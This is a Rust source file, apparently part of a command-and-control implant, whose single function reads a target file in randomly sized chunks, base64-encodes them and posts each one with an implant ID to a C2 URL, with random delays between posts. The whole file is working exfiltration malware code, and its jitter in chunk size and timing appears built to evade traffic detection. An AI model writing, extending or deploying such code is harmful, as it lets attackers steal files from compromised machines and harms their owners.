use base64::{engine::general_purpose::STANDARD, Engine as _};
use rand::Rng;
use reqwest::Client;
use std::{fs::File, io::Read, path::Path, time::Duration};
use uuid::Uuid;

const MIN_CHUNK_SIZE: usize = 256 * 1024; // 256 KB
const MAX_CHUNK_SIZE: usize = 1024 * 1024; // 1 MB

pub async fn send_file(
    implant_id: Uuid,
    file_path: &Path,
    c2_url: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let mut file = File::open(file_path)?;
    let mut chunk_index = 0;

    let mut rng = rand::thread_rng();

    let file_id = Uuid::new_v4().to_string();

    loop {
        // Generate a random chunk size within the specified range
        let chunk_size = rng.gen_range(MIN_CHUNK_SIZE..=MAX_CHUNK_SIZE);
        let mut buffer = vec![0; chunk_size];

        match file.read(&mut buffer) {
            Ok(bytes_read) if bytes_read > 0 => {
                let chunk_data = &buffer[..bytes_read];

                // Encode with base64 for the transfer
                let encoded_chunk = STANDARD.encode(chunk_data);

                let response = client
                    .post(c2_url)
                    .json(&serde_json::json!({
                        "uuid": implant_id,
                        "file_id": &file_id,
                        "chunk_index": chunk_index,
                        "chunk_data": &encoded_chunk,
                    }))
                    .send()
                    .await;

                match response {
                    Ok(response) => {
                        if !response.status().is_success() {
                            eprintln!(
                                "Failed to send chunk {}, status: {}",
                                chunk_index,
                                response.status()
                            );
                        }
                    }
                    Err(e) => {
                        eprintln!("Error sending chunk {}: {}", chunk_index, e);
                    }
                }

                chunk_index += 1;
            }
            Ok(_) => {
                println!("Successfully sent all chunks! File id: {}", file_id);
                break;
            }
            // End of file
            Err(e) => return Err(Box::new(e)),
        }
        let millis_to_sleep = rand::thread_rng().gen_range(505..1250);
        std::thread::sleep(Duration::from_millis(millis_to_sleep));
    }
    Ok(())
}
